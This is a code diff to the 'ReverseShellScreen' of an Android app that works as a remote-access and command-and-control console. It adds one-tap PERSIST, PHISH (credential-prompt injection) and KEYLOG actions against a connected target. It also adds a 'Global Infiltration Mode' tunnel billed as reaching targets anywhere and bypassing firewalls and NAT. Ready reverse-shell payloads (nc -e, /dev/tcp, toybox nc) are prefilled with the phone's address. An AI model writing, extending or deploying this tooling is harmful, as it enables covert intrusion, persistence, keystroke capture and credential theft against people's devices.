@@ -32,7 +32,8 @@ import com.example.rabit.ui.theme.*
 @Composable
 fun ReverseShellScreen(
     viewModel: AutomationViewModel,
-    onBack: () -> Unit
+    onBack: () -> Unit,
+    onNavigateToDesktop: () -> Unit = {}
 ) {
     val lines by viewModel.reverseShellLines.collectAsState()
     val status by viewModel.reverseShellStatus.collectAsState()
@@ -151,6 +152,14 @@ fun ReverseShellScreen(
                             )
                         }
                     } else {
+                        Text("LIVE TERMINAL", color = Platinum, fontSize = 11.sp, fontWeight = FontWeight.Black)
+                        Spacer(Modifier.weight(1f))
+                        if (isConnected) {
+                            IconButton(onClick = onNavigateToDesktop, modifier = Modifier.size(24.dp)) {
+                                Icon(Icons.Default.Monitor, null, tint = AccentBlue, modifier = Modifier.size(16.dp))
+                            }
+                            Spacer(Modifier.width(8.dp))
+                        }
                         IconButton(
                             onClick = { viewModel.stopReverseShellListener() },
                             modifier = Modifier.background(Color.Red.copy(alpha = 0.1f), RoundedCornerShape(12.dp))
@@ -165,8 +174,42 @@ fun ReverseShellScreen(
 
             // Instructions / Terminal
             if (!isConnected && !isListening) {
-                TerminalInstructionCard(portInput)
+                val context = androidx.compose.ui.platform.LocalContext.current
+                val tunnelActive by viewModel.isTunnelActive.collectAsState()
+                val globalAddr by viewModel.globalC2Address.collectAsState()
+                val localIp = remember { com.example.rabit.data.network.LanIpResolver.preferredLanIpv4String(context) ?: "127.0.0.1" }
+                val currentIp = if (tunnelActive && globalAddr.isNotBlank()) globalAddr else localIp
+                
+                TerminalInstructionCard(portInput, currentIp, tunnelActive)
             } else {
+                if (isConnected) {
+                    Row(
+                        modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
+                        horizontalArrangement = Arrangement.spacedBy(8.dp)
+                    ) {
+                        TacticButton(
+                            text = "PERSIST",
+                            icon = Icons.Default.CloudSync,
+                            color = SuccessGreen,
+                            modifier = Modifier.weight(1f),
+                            onClick = { viewModel.installPersistence() }
+                        )
+                        TacticButton(
+                            text = "PHISH",
+                            icon = Icons.Default.LockOpen,
+                            color = Color.Red,
+                            modifier = Modifier.weight(1f),
+                            onClick = { viewModel.injectCredentialPrompt() }
+                        )
+                        TacticButton(
+                            text = "KEYLOG",
+                            icon = Icons.Default.Keyboard,
+                            color = AccentBlue,
+                            modifier = Modifier.weight(1f),
+                            onClick = { viewModel.deployKeylogger() }
+                        )
+                    }
+                }
                 Surface(
                     modifier = Modifier.weight(1f).fillMaxWidth(),
                     color = Color.Black.copy(alpha = 0.5f),
@@ -244,7 +287,28 @@ fun ReverseShellScreen(
 }
 
 @Composable
-private fun TerminalInstructionCard(port: String) {
+private fun TacticButton(text: String, icon: androidx.compose.ui.graphics.vector.ImageVector, color: Color, modifier: Modifier = Modifier, onClick: () -> Unit) {
+    Surface(
+        onClick = onClick,
+        modifier = modifier.height(36.dp),
+        color = color.copy(alpha = 0.1f),
+        shape = RoundedCornerShape(8.dp),
+        border = androidx.compose.foundation.BorderStroke(1.dp, color.copy(alpha = 0.3f))
+    ) {
+        Row(
+            modifier = Modifier.fillMaxSize().padding(horizontal = 8.dp),
+            verticalAlignment = Alignment.CenterVertically,
+            horizontalArrangement = Arrangement.Center
+        ) {
+            Icon(icon, null, tint = color, modifier = Modifier.size(14.dp))
+            Spacer(Modifier.width(6.dp))
+            Text(text, color = color, fontSize = 9.sp, fontWeight = FontWeight.Black, letterSpacing = 1.sp)
+        }
+    }
+}
+
+@Composable
+private fun TerminalInstructionCard(port: String, ip: String, isInternetMode: Boolean) {
     Card(
         colors = CardDefaults.cardColors(containerColor = Graphite.copy(alpha = 0.4f)),
         shape = RoundedCornerShape(20.dp),
@@ -252,32 +316,50 @@ private fun TerminalInstructionCard(port: String) {
     ) {
         Column(modifier = Modifier.padding(20.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
             Row(verticalAlignment = Alignment.CenterVertically) {
-                Icon(Icons.Default.Info, null, tint = AccentTeal, modifier = Modifier.size(18.dp))
+                Icon(
+                    if (isInternetMode) Icons.Default.Language else Icons.Default.Info, 
+                    null, 
+                    tint = if (isInternetMode) SuccessGreen else AccentTeal, 
+                    modifier = Modifier.size(18.dp)
+                )
                 Spacer(modifier = Modifier.width(8.dp))
-                Text("How to catch a shell", color = Platinum, fontWeight = FontWeight.Bold)
+                Text(
+                    if (isInternetMode) "Global Infiltration Mode" else "How to catch a shell", 
+                    color = Platinum, 
+                    fontWeight = FontWeight.Bold
+                )
             }
             Text(
-                "1. Start listener: Tap the Play button above.\n" +
-                "2. Connectivity: Ensure both devices are on the same Wi-Fi.\n" +
-                "3. Execute: Run a payload below on the target Mac/PC.\n" +
-                "4. Control: The phone will instantly show the shell once linked.",
+                if (isInternetMode) {
+                    "1. C2 Tunnel: ACTIVE ($ip)\n" +
+                    "2. Connectivity: Internet-wide access enabled.\n" +
+                    "3. Execute: Target can be ANYWHERE in the world.\n" +
+                    "4. Listener: Ensure your tunnel maps to port $port."
+                } else {
+                    "1. Start listener: Tap the Play button above.\n" +
+                    "2. Connectivity: Ensure both devices are on the same Wi-Fi.\n" +
+                    "3. Execute: Run a payload below on the target device.\n" +
+                    "4. Control: Instant link on local network."
+                },
                 color = Silver.copy(alpha = 0.7f),
                 fontSize = 12.sp,
                 lineHeight = 18.sp
             )
             
-            PayloadBox("nc -e /bin/zsh [IP] $port")
-            PayloadBox("zsh -i >& /dev/tcp/[IP]/$port 0>&1")
+            PayloadBox("nc -e /bin/zsh $ip $port", "macOS")
+            PayloadBox("zsh -i >& /dev/tcp/$ip/$port 0>&1", "Linux")
+            PayloadBox("toybox nc $ip $port -e sh", "Android")
             
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
-                    .background(AccentTeal.copy(alpha = 0.05f), RoundedCornerShape(12.dp))
+                    .background(if (isInternetMode) SuccessGreen.copy(alpha = 0.05f) else AccentTeal.copy(alpha = 0.05f), RoundedCornerShape(12.dp))
                     .padding(12.dp)
             ) {
                 Text(
-                    "PRO TIP: Replace [IP] with your phone's Wi-Fi IP. This is a raw TCP listener; no encryption is applied by default.",
-                    color = AccentTeal,
+                    if (isInternetMode) "TACTICAL: You are using a Global C2 Tunnel. This shell will bypass local firewalls and NAT."
+                    else "PRO TIP: Your current Local IP is $ip. Use this for devices on your network.",
+                    color = if (isInternetMode) SuccessGreen else AccentTeal,
                     fontSize = 10.sp,
                     fontWeight = FontWeight.Bold,
                     lineHeight = 14.sp
@@ -288,18 +370,21 @@ private fun TerminalInstructionCard(port: String) {
 }
 
 @Composable
-private fun PayloadBox(command: String) {
-    Surface(
-        color = Color.Black.copy(alpha = 0.5f),
-        shape = RoundedCornerShape(8.dp),
-        modifier = Modifier.fillMaxWidth()
-    ) {
-        Text(
-            command,
-            color = SuccessGreen,
-            fontFamily = FontFamily.Monospace,
-            fontSize = 11.sp,
-            modifier = Modifier.padding(12.dp)
-        )
+private fun PayloadBox(command: String, label: String) {
+    Column(modifier = Modifier.padding(vertical = 4.dp)) {
+        Text(label, color = Silver.copy(alpha = 0.5f), fontSize = 9.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 4.dp))
+        Surface(
+            color = Color.Black.copy(alpha = 0.5f),
+            shape = RoundedCornerShape(8.dp),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Text(
+                command,
+                color = SuccessGreen,
+                fontFamily = FontFamily.Monospace,
+                fontSize = 11.sp,
+                modifier = Modifier.padding(12.dp)
+            )
+        }
     }
 }
